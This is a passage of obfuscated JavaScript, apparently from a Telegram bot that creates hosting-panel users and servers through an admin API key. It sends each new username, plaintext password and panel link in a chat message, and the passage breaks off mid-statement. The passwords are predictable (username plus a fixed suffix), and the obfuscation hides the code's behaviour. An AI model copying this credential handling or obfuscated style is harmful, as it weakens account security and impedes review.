_0x1ce978[_0x240d04(0x1477)](fetch,_0x1ce978[_0x240d04(0x15a2)](_0x1ce978[_0x240d04(0x1490)](domain,_0x1ce978['FoSRt']),_0x1178f6),{'method':_0x1ce978['CNfsd'],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x1cc3)](_0x1ce978[_0x240d04(0x2c45)],apikey)}});const _0xcaa29=_0x240d04(0x431)+_0x369cbc[_0x240d04(0x1c39)]`@`[0x0]+(_0x240d04(0x266a)+'ERNAME*\x20:\x20')+_0x192313['username']+('\x0a⎙─➤\x20*🔐PAS'+_0x240d04(0x2424))+_0x2e9053+(_0x240d04(0x115)+_0x240d04(0x17d2))+linkpanel+(_0x240d04(0x2863)+_0x240d04(0x2e3b)+_0x240d04(0x5cb)+'X\x20DATA\x20\x0aAK'+_0x240d04(0xf8d)+_0x240d04(0x366)+_0x240d04(0x24d)+'AIK\x0aKALAU\x20'+_0x240d04(0x2337)+_0x240d04(0xce4)+_0x240d04(0x224f)+_0x240d04(0x1b3f)+_0x240d04(0x2b10)+_0x240d04(0x527)+_0x240d04(0x19ae)+_0x240d04(0x1775)+_0x240d04(0x1775)+'=========='+'=\x0a');await _0x23c0de['telegram']['sendPhoto'](_0x369cbc,{'source':THUMBNAIL},{'caption':_0xcaa29,'parse_mode':_0x240d04(0x21a9),'disable_web_page_preview':!![]});let _0x2ce797=await _0x2f66b0[_0x240d04(0x1314)](),_0x1ef055=await _0x1ce978['ULoIb'](fetch,_0x1ce978[_0x240d04(0x702)](domain,_0x1ce978['dWIMx']),{'method':'POST','headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978[_0x240d04(0x2e5a)](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON['stringify']({'name':_0x2972da,'description':'\x20','user':_0x192313['id'],'egg':_0x1ce978[_0x240d04(0x103a)](parseInt,_0x1178f6),'docker_image':_0x1ce978['MzhZx'],'startup':_0x1ce978[_0x240d04(0x2dd0)],'environment':{'INST':_0x1ce978[_0x240d04(0x10c3)],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x1ce978[_0x240d04(0x2e0b)]},'limits':{'memory':_0x259d5c,'swap':0x0,'disk':_0x1729a3,'io':0x1f4,'cpu':_0x1928ab},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[_0x1ce978[_0x240d04(0xe8d)](parseInt,_0x13cbf3)],'dedicated_ip':![],'port_range':[]}})}),_0x5a29ac=await _0x1ef055[_0x240d04(0x1314)]();if(_0x5a29ac[_0x240d04(0x247c)])return _0x476bfb(JSON[_0x240d04(0x1cf5)](_0x5a29ac['errors'][0x0],null,0x2));let _0x94d755=_0x5a29ac[_0x240d04(0x2e69)],_0x2a1fe3=await _0x1ce978[_0x240d04(0x525)](_0x476bfb,_0x240d04(0x1e8)+_0x240d04(0x1ebe)+_0x240d04(0x6b4)+_0x240d04(0x62e)+_0x240d04(0x1ee7)+_0x192313['id']+_0x240d04(0xe01)+_0x192313[_0x240d04(0x268b)]+'\x20'+_0x192313['last_name']+_0x240d04(0x242c)+(_0x94d755[_0x240d04(0x25d5)][_0x240d04(0x187b)]===0x0?_0x1ce978[_0x240d04(0xc1a)]:_0x94d755[_0x240d04(0x25d5)]['memory'])+_0x240d04(0x173)+(_0x1ce978[_0x240d04(0x1817)](_0x94d755[_0x240d04(0x25d5)][_0x240d04(0x26cd)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x94d755[_0x240d04(0x25d5)][_0x240d04(0x26cd)])+'\x20MB\x0aCPU:\x20'+_0x94d755['limits'][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x476bfb(_0x1ce978[_0x240d04(0x273c)]);}}break;case _0x240d04(0x29e6):{if(!_0x69d638)return _0x1ce978[_0x240d04(0x1b00)](_0x476bfb,_0x1ce978[_0x240d04(0xe02)]);const _0x4266b1=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978['WENgg'](_0x4266b1[_0x240d04(0x2b45)],0x2))return _0x1ce978['Yymbg'](_0x476bfb,'*Format\x20sa'+'lah!*\x0aPeng'+_0x240d04(0x2458)+_0x1ce978[_0x240d04(0x2044)](_0x1ec495,_0x3e6565)+('\x20user,idte'+'le'));const _0x4682c2=_0x4266b1[0x0],_0x2880d4=_0x4266b1[0x1];let _0x2f9a80=_0x4682c2,_0xca2b54=global[_0x240d04(0x107)],_0xa29c69=global[_0x240d04(0x241e)],_0x3be8d0=_0x1ce978[_0x240d04(0x1918)],_0x228efd='60',_0x7f1418=_0x1ce978[_0x240d04(0x1918)],_0x57aabc=_0x4682c2+_0x1ce978[_0x240d04(0xc84)];try{let _0x46d5c2=_0x1ce978[_0x240d04(0xdba)](_0x4682c2,_0x1ce978[_0x240d04(0x1bfa)]),_0xd61de7=await _0x1ce978[_0x240d04(0x162f)](fetch,_0x1ce978[_0x240d04(0x2cda)](domain,_0x1ce978['AErmr']),{'method':_0x240d04(0x4c1),'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x240d04(0x2724)+'n/json','Authorization':_0x1ce978['UAqzM'](_0x1ce978['lCEEi'],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x57aabc,'username':_0x4682c2,'first_name':_0x4682c2,'last_name':_0x4682c2,'language':'en','password':_0x46d5c2})}),_0x4790f1=await _0xd61de7[_0x240d04(0x1314)]();if(_0x4790f1[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x1d0)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x4790f1[_0x240d04(0x247c)][0x0],null,0x2));let _0x478147=_0x4790f1['attributes'],_0x5a9cb4=await _0x1ce978[_0x240d04(0x1551)](fetch,domain+_0x1ce978[_0x240d04(0x1615)]+_0xca2b54,{'method':'GET','headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x1689)](_0x1ce978[_0x240d04(0x2c45)],apikey)}});const _0x2aeb1f=_0x240d04(0x431)+_0x2880d4[_0x240d04(0x1c39)]`@`[0x0]+(_0x240d04(0x266a)+_0x240d04(0xae0))+_0x478147[_0x240d04(0x181b)]+('\x0a⎙─➤\x20*🔐PAS'+_0x240d04(0x2424))+_0x46d5c2+(_0x240d04(0x115)+_0x240d04(0x17d2))+linkpanel+(_0x240d04(0x2863)+_0x240d04(0x2e3b)+_0x240d04(0x5cb)+_0x240d04(0x2573)+'UN\x20ANDA\x20MO'+_0x240d04(0x366)+_0x240d04(0x24d)+_0x240d04(0x2c43)+_0x240d04(0x2337)+'ANDA\x20HILAN'+_0x240d04(0x224f)+_0x240d04(0x1b3f)+'MENGIRIM\x20A'+_0x240d04(0x527)+'AGI\x0a======'+'=========='+_0x240d04(0x1775)+_0x240d04(0x1775)+'=\x0a');await _0x23c0de[_0x240d04(0x1986)][_0x240d04(0x2622)](_0x2880d4,{'source':THUMBNAIL},{'caption':_0x2aeb1f,'parse_mode':_0x1ce978['AWHzb'],'disable_web_page_preview':!![]});let _0x15b654=await _0x5a9cb4[_0x240d04(0x1314)](),_0x54cbe6=await fetch(_0x1ce978['rtSbi'](domain,_0x240d04(0x12bd)+'cation/ser'+_0x240d04(0xfb1)),{'method':_0x1ce978['TMKIo'],'headers':{'Accept':_0x240d04(0x2724)+'n/json','Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x16ce)](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON['stringify']({'name':_0x2f9a80,'description':'\x20','user':_0x478147['id'],'egg':_0x1ce978[_0x240d04(0x1841)](parseInt,_0xca2b54),'docker_image':'ghcr.io/pa'+'rkervcp/yo'+_0x240d04(0xb2d)+'_18','startup':_0x240d04(0x2c6b)+'git\x20]]\x20&&\x20'+_0x240d04(0xbac)+_0x240d04(0x10d8)+_0x240d04(0xc7b)+_0x240d04(0x1bbc)+_0x240d04(0x1441)+_0x240d04(0x2b40)+'{NODE_PACK'+_0x240d04(0x29fb)+_0x240d04(0x1657)+'local/bin/'+_0x240d04(0xb3b)+_0x240d04(0x25be)+'ACKAGES};\x20'+_0x240d04(0x2221)+_0x240d04(0x814)+_0x240d04(0x883)+_0x240d04(0x12dd)+_0x240d04(0x16e0)+'cal/bin/np'+_0x240d04(0x1062)+_0x240d04(0x7e1)+_0x240d04(0x56b)+_0x240d04(0x2e3d)+'\x20-f\x20/home/'+_0x240d04(0x979)+_0x240d04(0x25b7)+_0x240d04(0x1849)+_0x240d04(0xa26)+_0x240d04(0x792)+_0x240d04(0x383)+_0x240d04(0x1a34)+'cal/bin/${'+_0x240d04(0x266e),'environment':{'INST':_0x1ce978['RksBX'],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x1ce978[_0x240d04(0x2e0b)]},'limits':{'memory':_0x3be8d0,'swap':0x0,'disk':_0x7f1418,'io':0x1f4,'cpu':_0x228efd},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[parseInt(_0xa29c69)],'dedicated_ip':![],'port_range':[]}})}),_0x19b400=await _0x54cbe6[_0x240d04(0x1314)]();if(_0x19b400['errors'])return _0x1ce978['QoylN'](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x19b400['errors'][0x0],null,0x2));let _0x22a59f=_0x19b400[_0x240d04(0x2e69)],_0x235e13=await _0x1ce978['xVhlL'](_0x476bfb,_0x240d04(0x1e8)+_0x240d04(0x1ebe)+'SER\x20+\x20SERV'+_0x240d04(0x62e)+_0x240d04(0x1ee7)+_0x478147['id']+_0x240d04(0xe01)+_0x478147[_0x240d04(0x268b)]+'\x20'+_0x478147[_0x240d04(0x19fc)]+_0x240d04(0x242c)+(_0x1ce978[_0x240d04(0x25fe)](_0x22a59f[_0x240d04(0x25d5)][_0x240d04(0x187b)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x22a59f[_0x240d04(0x25d5)]['memory'])+_0x240d04(0x173)+(_0x22a59f[_0x240d04(0x25d5)][_0x240d04(0x26cd)]===0x0?_0x240d04(0x1b62):_0x22a59f[_0x240d04(0x25d5)]['disk'])+_0x240d04(0x2541)+_0x22a59f[_0x240d04(0x25d5)][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x1ce978[_0x240d04(0x2d35)](_0x1ce978[_0x240d04(0x2232)],_0x1ce978[_0x240d04(0x2232)])?_0xd100c0[_0x4fa97b]&&_0x1ce978[_0x240d04(0x1b06)](_0x44664c[_0x240d04(0x104e)](),_0x49f3bf[_0x1915b5][_0x240d04(0x1e3f)])>=0xea60&&(_0x1ce978[_0x240d04(0x1a7b)](_0x572769,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x241cc2(_0x4c2146)+'*'),delete _0x26c521[_0x5defba]):_0x476bfb(_0x1ce978[_0x240d04(0x273c)]);}}break;case _0x240d04(0x1f4b):{if(_0x1ce978[_0x240d04(0x1acd)](_0x1ce978['stXkp'],_0x1ce978[_0x240d04(0x512)]))return _0x233929(_0x1ce978[_0x240d04(0x17c4)]);else{if(!_0x69d638)return _0x1ce978[_0x240d04(0x22d5)](_0x476bfb,_0x1ce978[_0x240d04(0xe02)]);const _0x40167f=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978[_0x240d04(0x13ac)](_0x40167f['length'],0x2))return _0x476bfb(_0x240d04(0x17e9)+_0x240d04(0x2c0b)+'gunaan:\x20'+(_0x1ec495+_0x3e6565)+(_0x240d04(0x329)+'le'));const _0x362841=_0x40167f[0x0],_0x427b26=_0x40167f[0x1];let _0x1ed626=_0x362841,_0xf675e6=global[_0x240d04(0x107)],_0x4dd721=global[_0x240d04(0x241e)],_0x1b4998=_0x1ce978[_0x240d04(0xe4b)],_0x17ef23='90',_0x429634=_0x1ce978[_0x240d04(0xe4b)],_0x56acd1=_0x1ce978[_0x240d04(0x631)](_0x362841,_0x1ce978[_0x240d04(0xc84)]);try{let _0x5b35bc=_0x1ce978['ihAKJ'](_0x362841,_0x1ce978['QXBsn']),_0x36d19c=await _0x1ce978[_0x240d04(0x1d51)](fetch,_0x1ce978[_0x240d04(0x2c98)](domain,_0x1ce978[_0x240d04(0x1f58)]),{'method':'POST','headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978['BDhyS'](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x56acd1,'username':_0x362841,'first_name':_0x362841,'last_name':_0x362841,'language':'en','password':_0x5b35bc})}),_0x4d68fe=await _0x36d19c['json']();if(_0x4d68fe[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x225)](_0x476bfb,JSON['stringify'](_0x4d68fe[_0x240d04(0x247c)][0x0],null,0x2));let _0x533580=_0x4d68fe['attributes'],_0xa5bd5a=await _0x1ce978[_0x240d04(0x1b88)](fetch,_0x1ce978[_0x240d04(0x1d69)](domain,_0x1ce978[_0x240d04(0x1615)])+_0xf675e6,{'method':'GET','headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978['ahMxi'](_0x1ce978[_0x240d04(0x2c45)],apikey)}});const _0xce5d41=_0x240d04(0x431)+_0x427b26[_0x240d04(0x1c39)]`@`[0x0]+(_0x240d04(0x266a)+_0x240d04(0xae0))+_0x533580[_0x240d04(0x181b)]+(_0x240d04(0x1d64)+'SWORD*\x20:\x20')+_0x5b35bc+(_0x240d04(0x115)+'IN*\x20:\x20')+linkpanel+(_0x240d04(0x2863)+_0x240d04(0x2e3b)+_0x240d04(0x5cb)+_0x240d04(0x2573)+_0x240d04(0xf8d)+'HON\x20DI\x20SIM'+_0x240d04(0x24d)+_0x240d04(0x2c43)+_0x240d04(0x2337)+_0x240d04(0xce4)+_0x240d04(0x224f)+_0x240d04(0x1b3f)+_0x240d04(0x2b10)+'KUN\x20ANDA\x20L'+_0x240d04(0x19ae)+'=========='+_0x240d04(0x1775)+'=========='+'=\x0a');await _0x23c0de[_0x240d04(0x1986)][_0x240d04(0x2622)](_0x427b26,{'source':THUMBNAIL},{'caption':_0xce5d41,'parse_mode':'Markdown','disable_web_page_preview':!![]});let _0x1d1b0c=await _0xa5bd5a[_0x240d04(0x1314)](),_0x164ce2=await _0x1ce978[_0x240d04(0x162f)](fetch,_0x1ce978['rZApO'](domain,_0x240d04(0x12bd)+_0x240d04(0x13d8)+'vers'),{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':'applicatio'+_0x240d04(0x13e4),'Authorization':_0x1ce978['lmlMm'](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'name':_0x1ed626,'description':'\x20','user':_0x533580['id'],'egg':_0x1ce978['hbsLO'](parseInt,_0xf675e6),'docker_image':_0x1ce978[_0x240d04(0x5d6)],'startup':'if\x20[[\x20-d\x20.'+_0x240d04(0x1253)+_0x240d04(0xbac)+_0x240d04(0x10d8)+_0x240d04(0xc7b)+'hen\x20git\x20pu'+'ll;\x20fi;\x20if'+'\x20[[\x20!\x20-z\x20$'+'{NODE_PACK'+_0x240d04(0x29fb)+_0x240d04(0x1657)+_0x240d04(0x718)+_0x240d04(0xb3b)+_0x240d04(0x25be)+_0x240d04(0x1b5b)+_0x240d04(0x2221)+_0x240d04(0x814)+_0x240d04(0x883)+_0x240d04(0x12dd)+'en\x20/usr/lo'+'cal/bin/np'+_0x240d04(0x1062)+_0x240d04(0x7e1)+_0x240d04(0x56b)+';\x20fi;\x20if\x20['+_0x240d04(0x168d)+_0x240d04(0x979)+_0x240d04(0x25b7)+_0x240d04(0x1849)+_0x240d04(0xa26)+_0x240d04(0x792)+'install;\x20f'+'i;\x20/usr/lo'+_0x240d04(0x391)+_0x240d04(0x266e),'environment':{'INST':_0x1ce978[_0x240d04(0x10c3)],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x1ce978[_0x240d04(0x2e0b)]},'limits':{'memory':_0x1b4998,'swap':0x0,'disk':_0x429634,'io':0x1f4,'cpu':_0x17ef23},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[_0x1ce978[_0x240d04(0x1688)](parseInt,_0x4dd721)],'dedicated_ip':![],'port_range':[]}})}),_0x362c17=await _0x164ce2['json']();if(_0x362c17[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x1275)](_0x476bfb,JSON['stringify'](_0x362c17['errors'][0x0],null,0x2));let _0x211370=_0x362c17['attributes'],_0x23199d=await _0x476bfb(_0x240d04(0x1e8)+_0x240d04(0x1ebe)+_0x240d04(0x6b4)+'ER*\x0aTYPE:\x20'+_0x240d04(0x1ee7)+_0x533580['id']+_0x240d04(0xe01)+_0x533580[_0x240d04(0x268b)]+'\x20'+_0x533580[_0x240d04(0x19fc)]+_0x240d04(0x242c)+(_0x211370[_0x240d04(0x25d5)]['memory']===0x0?_0x1ce978[_0x240d04(0xc1a)]:_0x211370[_0x240d04(0x25d5)]['memory'])+'\x20MB\x0aDISK:\x20'+(_0x1ce978[_0x240d04(0x169)](_0x211370[_0x240d04(0x25d5)][_0x240d04(0x26cd)],0x0)?'Unlimited':_0x211370[_0x240d04(0x25d5)][_0x240d04(0x26cd)])+'\x20MB\x0aCPU:\x20'+_0x211370[_0x240d04(0x25d5)][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x1ce978[_0x240d04(0x2bd5)](_0x476bfb,_0x240d04(0x1736)+_0x240d04(0x690)+_0x240d04(0x1848)+'pi\x20plta\x20da'+_0x240d04(0x2bdf)+'a_');}}}break;case _0x1ce978[_0x240d04(0x1d57)]:{if(!_0x69d638)return _0x1ce978[_0x240d04(0x9a1)](_0x476bfb,_0x1ce978['JBikg']);const _0x1d3959=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1d3959[_0x240d04(0x2b45)]<0x2)return _0x1ce978['oEZgz'](_0x476bfb,_0x240d04(0x17e9)+'lah!*\x0aPeng'+_0x240d04(0x2458)+_0x1ce978[_0x240d04(0x18a5)](_0x1ec495,_0x3e6565)+(_0x240d04(0x329)+'le'));const _0x421345=_0x1d3959[0x0],_0x327a14=_0x1d3959[0x1];let _0x62d3af=_0x421345,_0x4b35f8=global[_0x240d04(0x107)],_0x2ae495=global[_0x240d04(0x241e)],_0x6c5013=_0x1ce978[_0x240d04(0x1a8)],_0x2bb7e9=_0x1ce978['asqii'],_0x4c466b=_0x1ce978[_0x240d04(0x1a8)],_0x377ac8=_0x1ce978['trwXJ'](_0x421345,_0x1ce978[_0x240d04(0xc84)]);try{let _0x2364a0=_0x1ce978['kHsUa'](_0x421345,_0x1ce978[_0x240d04(0x1bfa)]),_0x5977f4=await _0x1ce978[_0x240d04(0x1b88)](fetch,domain+_0x1ce978[_0x240d04(0x1f58)],{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':'Bearer\x20'+apikey},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x377ac8,'username':_0x421345,'first_name':_0x421345,'last_name':_0x421345,'language':'en','password':_0x2364a0})}),_0x4f44dd=await _0x5977f4['json']();if(_0x4f44dd['errors'])return _0x1ce978[_0x240d04(0xc87)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x4f44dd[_0x240d04(0x247c)][0x0],null,0x2));let _0x4cd730=_0x4f44dd['attributes'],_0x4a752c=await _0x1ce978[_0x240d04(0x1210)](fetch,_0x1ce978[_0x240d04(0x2e25)](domain+('/api/appli'+_0x240d04(0x14b6)+_0x240d04(0x2b7b)),_0x4b35f8),{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x240d04(0x2724)+'n/json','Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978['bmedH']('Bearer\x20',apikey)}});const _0x27e96f=_0x240d04(0x431)+_0x327a14['split']`@`[0x0]+(_0x240d04(0x9c5)+_0x240d04(0xcd5)+'\x20')+_0x4cd730[_0x240d04(0x181b)]+(_0x240d04(0x1d64)+_0x240d04(0x2424))+_0x2364a0+(_0x240d04(0x115)+'IN*\x20:\x20')+linkpanel+(_0x240d04(0x2863)+_0x240d04(0x2e3b)+_0x240d04(0x5cb)+_0x240d04(0x2573)+_0x240d04(0xf8d)+_0x240d04(0x366)+'PAN\x20BAIK\x20B'+_0x240d04(0x2c43)+_0x240d04(0x2337)+_0x240d04(0xce4)+_0x240d04(0x224f)+_0x240d04(0x1b3f)+_0x240d04(0x2b10)+_0x240d04(0x527)+_0x240d04(0x19ae)+'=========='+_0x240d04(0x1775)+'=========='+'=\x0a');await _0x23c0de[_0x240d04(0x1986)]['sendPhoto'](_0x327a14,{'source':THUMBNAIL},{'caption':_0x27e96f,'parse_mode':_0x1ce978[_0x240d04(0xa1b)],'disable_web_page_preview':!![]});let _0x2b5804=await _0x4a752c[_0x240d04(0x1314)](),_0x3f8125=await _0x1ce978[_0x240d04(0x3d6)](fetch,domain+_0x1ce978[_0x240d04(0x1d08)],{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978[_0x240d04(0x12a1)](_0x1ce978['lCEEi'],apikey)},'body':JSON['stringify']({'name':_0x62d3af,'description':'\x20','user':_0x4cd730['id'],'egg':_0x1ce978[_0x240d04(0x2409)](parseInt,_0x4b35f8),'docker_image':_0x1ce978[_0x240d04(0x5d6)],'startup':_0x1ce978[_0x240d04(0x2dd0)],'environment':{'INST':_0x1ce978['RksBX'],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x1ce978['WusLf']},'limits':{'memory':_0x6c5013,'swap':0x0,'disk':_0x4c466b,'io':0x1f4,'cpu':_0x2bb7e9},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[parseInt(_0x2ae495)],'dedicated_ip':![],'port_range':[]}})}),_0x3447b5=await _0x3f8125['json']();if(_0x3447b5['errors'])return _0x476bfb(JSON[_0x240d04(0x1cf5)](_0x3447b5[_0x240d04(0x247c)][0x0],null,0x2));let _0x1a1066=_0x3447b5['attributes'],_0x2da933=await _0x1ce978[_0x240d04(0xc40)](_0x476bfb,_0x240d04(0x1e8)+_0x240d04(0x1ebe)+_0x240d04(0x6b4)+'ER*\x0aTYPE:\x20'+'user\x0aID:\x20'+_0x4cd730['id']+_0x240d04(0xe01)+_0x4cd730[_0x240d04(0x268b)]+'\x20'+_0x4cd730[_0x240d04(0x19fc)]+_0x240d04(0x242c)+(_0x1ce978['tWVqm'](_0x1a1066[_0x240d04(0x25d5)][_0x240d04(0x187b)],0x0)?_0x240d04(0x1b62):_0x1a1066[_0x240d04(0x25d5)][_0x240d04(0x187b)])+_0x240d04(0x173)+(_0x1ce978[_0x240d04(0x2033)](_0x1a1066[_0x240d04(0x25d5)][_0x240d04(0x26cd)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x1a1066[_0x240d04(0x25d5)][_0x240d04(0x26cd)])+_0x240d04(0x2541)+_0x1a1066[_0x240d04(0x25d5)][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x1ce978[_0x240d04(0xe0c)](_0x476bfb,_0x240d04(0x1736)+'om...\x0a_sil'+_0x240d04(0x1848)+_0x240d04(0xe6d)+_0x240d04(0x2bdf)+'a_');}}break;case _0x1ce978['AjllE']:{if(_0x1ce978[_0x240d04(0x1f5b)](_0x240d04(0x175a),_0x1ce978[_0x240d04(0x100f)]))_0x1ce978[_0x240d04(0x162d)](_0x3af732,_0x240d04(0xb17)+'bis!\x20Jawab'+_0x240d04(0x26d4)+_0x5bcbe7(_0x45bd9f)+'*'),delete _0x11bf38[_0x592bd6];else{if(!_0x69d638)return _0x1ce978[_0x240d04(0x221c)](_0x476bfb,_0x1ce978['JBikg']);const _0x3a0124=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978[_0x240d04(0xf94)](_0x3a0124[_0x240d04(0x2b45)],0x2))return _0x476bfb(_0x240d04(0x17e9)+_0x240d04(0x2c0b)+_0x240d04(0x2458)+_0x1ce978[_0x240d04(0x7ca)](_0x1ec495,_0x3e6565)+(_0x240d04(0x329)+'le'));const _0x34dea7=_0x3a0124[0x0],_0x1c3058=_0x3a0124[0x1];let _0x1685bf=_0x34dea7,_0x7ff65e=global[_0x240d04(0x107)],_0x55b6c0=global[_0x240d04(0x241e)],_0x478bb1=_0x240d04(0x2ca),_0x6d042c=_0x1ce978['WpeFL'],_0x28f01a=_0x1ce978[_0x240d04(0x2d54)],_0x1fd386=_0x1ce978['viBGy'](_0x34dea7,'1398@gmail'+_0x240d04(0x10cb));try{let _0x1b1b05=_0x1ce978[_0x240d04(0x288e)](_0x34dea7,_0x240d04(0x2061)),_0x1ce133=await _0x1ce978['eYpDx'](fetch,_0x1ce978[_0x240d04(0x7b9)](domain,_0x1ce978[_0x240d04(0x1f58)]),{'method':'POST','headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978['btLYK'],'Authorization':'Bearer\x20'+apikey},'body':JSON['stringify']({'email':_0x1fd386,'username':_0x34dea7,'first_name':_0x34dea7,'last_name':_0x34dea7,'language':'en','password':_0x1b1b05})}),_0x484613=await _0x1ce133[_0x240d04(0x1314)]();if(_0x484613[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x251a)](_0x476bfb,JSON['stringify'](_0x484613[_0x240d04(0x247c)][0x0],null,0x2));let _0x2ab198=_0x484613[_0x240d04(0x2e69)],_0x5a220c=await _0x1ce978[_0x240d04(0x1f07)](fetch,domain+_0x1ce978['FoSRt']+_0x7ff65e,{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x1643)](_0x1ce978[_0x240d04(0x2c45)],apikey)}});const _0x53697b='Hai\x20@'+_0x1c3058[_0x240d04(0x1c39)]`@`[0x0]+('\x0a\x0a⎙─➤\x20*👤US'+_0x240d04(0xae0))+_0x2ab198[_0x240d04(0x181b)]+('\x0a⎙─➤\x20*🔐PAS'+'SWORD*\x20:\x20')+_0x1b1b05+(_0x240d04(0x115)+_0x240d04(0x17d2))+linkpanel+(_0x240d04(0x2863)+'NER\x20HANYA\x20'+_0x240d04(0x5cb)+_0x240d04(0x2573)+_0x240d04(0xf8d)+_0x240d04(0x366)+_0x240d04(0x24d)+'AIK\x0aKALAU\x20'+'DATA\x20AKUN\x20'+'ANDA\x20HILAN'+'G\x20OWNER\x0aTI'+'DAK\x20DAPAT\x20'+_0x240d04(0x2b10)+_0x240d04(0x527)+_0x240d04(0x19ae)+_0x240d04(0x1775)+_0x240d04(0x1775)+_0x240d04(0x1775)+'=\x0a');await _0x23c0de['telegram'][_0x240d04(0x2622)](_0x1c3058,{'source':THUMBNAIL},{'caption':_0x53697b,'parse_mode':_0x1ce978[_0x240d04(0xa1b)],'disable_web_page_preview':!![]});let _0x2f1b93=await _0x5a220c[_0x240d04(0x1314)](),_0x282cb7=await _0x1ce978[_0x240d04(0x2921)](fetch,domain+(_0x240d04(0x12bd)+_0x240d04(0x13d8)+'vers'),{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978['ZcKhS'](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'name':_0x1685bf,'description':'\x20','user':_0x2ab198['id'],'egg':_0x1ce978['tTCQD'](parseInt,_0x7ff65e),'docker_image':_0x1ce978[_0x240d04(0x5d6)],'startup':_0x1ce978[_0x240d04(0x2dd0)],'environment':{'INST':_0x1ce978[_0x240d04(0x10c3)],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x1ce978[_0x240d04(0x2e0b)]},'limits':{'memory':_0x478bb1,'swap':0x0,'disk':_0x28f01a,'io':0x1f4,'cpu':_0x6d042c},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[_0x1ce978['eLuay'](parseInt,_0x55b6c0)],'dedicated_ip':![],'port_range':[]}})}),_0x2203b4=await _0x282cb7[_0x240d04(0x1314)]();if(_0x2203b4['errors'])return _0x1ce978[_0x240d04(0x24b3)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x2203b4[_0x240d04(0x247c)][0x0],null,0x2));let _0x18ae6c=_0x2203b4[_0x240d04(0x2e69)],_0x464a15=await 